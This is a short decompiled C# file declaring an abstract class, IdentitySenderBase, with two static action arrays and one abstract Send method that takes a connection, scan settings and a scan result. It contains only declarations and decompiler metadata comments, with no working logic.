using System;

// Token: 0x0200004A RID: 74
public abstract class IdentitySenderBase
{
	// Token: 0x1700000F RID: 15
	// (get) Token: 0x06000171 RID: 369 RVA: 0x00003CE9 File Offset: 0x00001EE9
	// (set) Token: 0x06000172 RID: 370 RVA: 0x00003CF0 File Offset: 0x00001EF0
	protected static ParsSt[] Actions { get; set; }

	// Token: 0x17000010 RID: 16
	// (get) Token: 0x06000173 RID: 371 RVA: 0x00003CF8 File Offset: 0x00001EF8
	// (set) Token: 0x06000174 RID: 372 RVA: 0x00003CFF File Offset: 0x00001EFF
	protected static ParsSt[] PreStageActions { get; set; }

	// Token: 0x06000175 RID: 373
	public abstract bool Send(EndpointConnection connection, ScanningArgs settings, ref ScanResult result);
}
